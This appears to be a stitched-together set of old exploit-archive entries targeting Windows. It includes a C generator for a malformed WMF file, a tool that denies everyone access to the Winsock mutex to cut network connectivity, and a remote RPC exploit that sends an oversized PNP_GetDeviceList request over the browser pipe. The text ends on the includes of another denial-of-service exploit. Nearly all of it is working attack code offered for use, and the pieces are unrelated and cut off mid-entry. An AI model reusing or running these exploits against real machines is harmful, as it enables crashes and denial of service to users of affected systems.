 * networks/systems setup for such a purpose. The author of this code shall not bear 
 * any responsibility for any damage caused by using this code. 
 *
 */

#include <stdio.h>

unsigned char wmfheader[] = 
"\xd7\xcd\xc6\x9a\x00\x00\xc6\xfb\xca\x02\xaa\x02\x39\x09\xe8\x03"
"\x00\x00\x00\x00\x66\xa6"
"\x01\x00"	   //mtType	
"\x09\x00"	   //mtHeaderSize
"\x00\x03"	   //mtVersion
"\xff\xff\xff\x7f" //mtSize
"\x00\x00"	   //mtNoObjects 
"\xff\xff\xff\xff" //mtMaxRecord
"\x00\x00";

unsigned char metafileRECORD[] = 
"\x05\x00\x00\x00\x0b\x02\x39\x09\xc6\xfb\x05\x00\x00\x00\x0c\x02"
"\x91\xf9\xe4\x06\x04\x00\x00\x00\x06\x01\x01\x00\x07\x00\x00\x00"
"\xfc\x02\x00\x00\x0e\x0d\x0d\x00\x00\x00\x04\x00\x00\x00\x2d\x01"
"\x00\x00\x08\x00\x00\x00\xfa\x02"
"\x05\x00\x00\x00\x00\x00\xff\xff\xff\x00\x04\x00\x00\x00\x2d\x01"
"\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03"
"\x08\x00\xc6\xfb\xca\x02\xbc\xfe\xca\x02\x0f\x01\x49\x06\xa5\x02"
"\x49\x06\xf4\x00\x68\x08\xd5\xfc\x65\x06\x86\xfe\x65\x06\xc6\xfb"
"\xca\x02\x08\x00\x00\x00\xfa\x02\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x04\x00\x00\x00\x2d\x01\x02\x00\x07\x00\x00\x00\xfc\x02"
"\x00\x00\xff\xff\xff\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x03\x00"
"\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00"
"\xbd\x34\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00"
"\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00"
"\x00\x00\x24\x03\x05\x00\xd5\xfc\x36\x07\xda\xfc\xd1\x06\x8b\xfe"
"\xd1\x06\x86\xfe\x36\x07\xd5\xfc\x36\x07\x04\x00\x00\x00\x2d\x01"
"\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01"
"\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34\x30\x00\x00\x00"
"\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00"
"\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00"
"\xc6\xfb\x9b\x03\xcb\xfb\x36\x03\xc1\xfe\x36\x03\xbc\xfe\x9b\x03"
"\xc6\xfb\x9b\x03\x04\x00\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00"
"\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00"
"\xfc\x02\x00\x00\xfb\x4e\x55\x00\x00\x00\x04\x00\x00\x00\x2d\x01"
"\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01"
"\x01\x00\x0e\x00\x00\x00\x24\x03\x05\x00\xbc\xfe\x9b\x03\xc1\xfe"
"\x36\x03\x14\x01\xb5\x06\x0f\x01\x1a\x07\xbc\xfe\x9b\x03\x04\x00"
"\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"
"\x00\x00\xf0\x01\x00\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xbd\x34"
"\x30\x00\x00\x00\x04\x00\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00"
"\x2d\x01\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x0e\x00\x00\x00"
"\x24\x03\x05\x00\x0f\x01\x1a\x07\x14\x01\xb5\x06\xaa\x02\xb5\x06"
"\xa5\x02\x1a\x07\x0f\x01\x1a\x07\x04\x00\x00\x00\x2d\x01\x02\x00"
"\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00"
"\x07\x00\x00\x00\xfc\x02\x00\x00\xfa\x94\x93\x00\x00\x00\x04\x00"
"\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00"
"\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03\x08\x00\xc6\xfb"
"\x9b\x03\xbc\xfe\x9b\x03\x0f\x01\x1a\x07\xa5\x02\x1a\x07\xf4\x00"
"\x39\x09\xd5\xfc\x36\x07\x86\xfe\x36\x07\xc6\xfb\x9b\x03\x04\x00"
"\x00\x00\x2d\x01\x02\x00\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00"
"\x00\x00\xf0\x01\x00\x00\x03\x00";

unsigned char wmfeof[] = 
"\x00\x00\x00\x00";

int main(int argc, char *argv[])
{
	FILE *fp;
	int metafilesizeW, recordsizeW;
	char wmfbuf[2048];
	int metafilesize, recordsize, i, j;
	
	metafilesize = sizeof (wmfheader) + sizeof (metafileRECORD) + sizeof(wmfeof) -3;
	metafilesizeW = metafilesize/2;
	recordsize = sizeof (metafileRECORD) -1;
	recordsizeW = recordsize/2;
	
	memcpy((unsigned long *)&wmfheader[28], &metafilesize, 4);
	memcpy((unsigned long *)&wmfheader[34], &recordsizeW, 4);

	printf("[*] Adding Metafile header\n");
	for (i = 0; i < sizeof(wmfheader) -1; i++) {
		(unsigned char)wmfbuf[i] = (unsigned char)wmfheader[i];
	}
			
	printf("[*] Adding metafile records\n");
	for (j = i, i = 0; i < sizeof(metafileRECORD) -1; i++, j++) {
		wmfbuf[j] = metafileRECORD[i];
	}
	
	printf("[*] Setting EOF\n");
	for (i = 0; i < sizeof(wmfeof) -1; i++, j++) {
		wmfbuf[j] = wmfeof[i];
	}

	printf("[*] Creating Metafile (MS053.wmf)\n");
	fp = fopen("MS053.wmf", "wb");
	fwrite(wmfbuf, 1, metafilesize, fp);
	fclose(fp);
}

// milw0rm.com [2005-11-30]
source: http://www.securityfocus.com/bid/2303/info

Microsoft Windows NT 4.0 is subject to a denial of service due to the implementation of incorrect permissions in a Mutex object. A local user could gain control of the Mutex on a networked machine and deny all network communication. 

/*
/* mutation.c - (c) 2000, Arne Vidstrom, arne.vidstrom@ntsecurity.nu
/*                        http://ntsecurity.nu
/*
/* - Disables all network connectivity through Winsock
/* - Can be run from any account (e.g. an ordinary User account)
/*
*/

#include <windows.h>
#include <aclapi.h>

int main(void)
{
	PSID pEveryoneSID;
	SID_IDENTIFIER_AUTHORITY iWorld = SECURITY_WORLD_SID_AUTHORITY;
	PACL pDacl;
	DWORD sizeNeeded;

	AllocateAndInitializeSid(&iWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);
	sizeNeeded = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) + GetLengthSid(pEveryoneSID) - sizeof(DWORD);
	pDacl = (PACL) malloc(sizeNeeded);
	InitializeAcl(pDacl, sizeNeeded, ACL_REVISION);
	AddAccessDeniedAce(pDacl, ACL_REVISION, GENERIC_ALL, pEveryoneSID);
	SetNamedSecurityInfo("Winsock2ProtocolCatalogMutex", SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pDacl, NULL);
	free(pDacl);
	return 0;
}

#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "mpr")
#pragma comment(lib, "Rpcrt4")


unsigned char szBindString[] =
{
       0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,
       0xb8,0x10,0xb8,0x10,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
       0x40,0x4e,0x9f,0x8d,0x3d,0xa0,0xce,0x11,0x8f,0x69,0x08,0x00,0x3e,0x30,0x05,0x1b,
       0x01,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,
       0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00
};

unsigned char szRequestString[] =
{
0x05,0x00,
0x00,0x03,0x10,0x00,0x00,0x00,0x30,0x08,0x00,0x00,0x01,0x00,0x00,0x00,0x18,0x08,
0x00,0x00,0x00,0x00,0x0a,0x00,0x44,0xf7,0x12,0x00,0x00,0x04,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x04,0x00,0x00,0x48,0x00,0x54,0x00,0x52,0x00,0x45,0x00,0x45,0x00,
0x5c,0x00,0x52,0x00,0x4f,0x00,0x4f,0x00,0x54,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,0x5c,0x00,
0x00,0x00,0x00,0x08,0x00,0x00,0x01,0x00,0x00,0x00
};


int main(int argc, char* argv[])
{
       char                    szServerName[MAX_PATH];
       char                    szPipe[MAX_PATH];
       HANDLE                  hFile;
       NETRESOURCE             nr;

       if (argc < 2){
               printf("[-] Usage: %s <host>\n", argv[0]);
               return -1;
       }

       if ( strlen(argv[1]) > (MAX_PATH - 50) ) {
               printf("[-] Host name %s is too long !\n");
               return -1;
       }

       printf("[+] Start connect host %s ... \n", argv[1]);
       wsprintf( szServerName, "\\\\%s\\pipe", argv[1] );
       nr.dwType               =       RESOURCETYPE_ANY;
       nr.lpLocalName  =       NULL;
       nr.lpRemoteName =       szServerName;
       nr.lpProvider   =       NULL;
       if ( WNetAddConnection2(&nr, "", "", 0) != NO_ERROR ) {
               printf("[-] Connect to host %s failed !\n", argv[1]);
               return -1;
       }

       _snprintf(szPipe, sizeof(szPipe), "\\\\%s\\pipe\\browser", argv[1]);
       hFile = CreateFile(szPipe, GENERIC_READ|GENERIC_WRITE, 0, NULL,
               OPEN_EXISTING, 0, NULL);

       if ( hFile == INVALID_HANDLE_VALUE ) {
               printf("[-] Open name pipe %s failed !\n", szPipe);
               return -1;
       }

       unsigned char   szOutBuffer[0X1000];
       unsigned long   nBytesRead;

       printf("[+] Start bind RPC interface ... \n");
       // bind rpc interface {8D9F4E40-A03D-11CE-8F69-08003E30051B}
       if ( ! TransactNamedPipe(hFile, szBindString, sizeof(szBindString),
               szOutBuffer, sizeof(szOutBuffer), &nBytesRead, NULL) ) {
               printf("[-] TransactNamedPipe (Binding) failed !\n");
               CloseHandle(hFile);
               return -1;
       }

       // send rpc request to call PNP_GetDeviceList (opnum 10)
       printf("[+] Start send RPC request ... \n");
       if ( ! TransactNamedPipe(hFile, szRequestString, sizeof(szRequestString),
               szOutBuffer, sizeof(szOutBuffer), &nBytesRead, NULL) ) {
               printf("[-] TransactNamedPipe (Binding) failed !\n");
               CloseHandle(hFile);
               return -1;
       }
       printf("[+] Attack host %s complete !\n", argv[1]);
       return 0;
}

// milw0rm.com [2005-10-21]
source: http://www.securityfocus.com/bid/67742/info

Microsoft Windows is prone to a local denial-of-service vulnerability.

A local attacker can exploit this issue to crash the affected computer, denying service to legitimate users. 

#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <winnt.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>
 
#pragma comment(lib, "ntdll")
#pragma comment(lib, "user32")
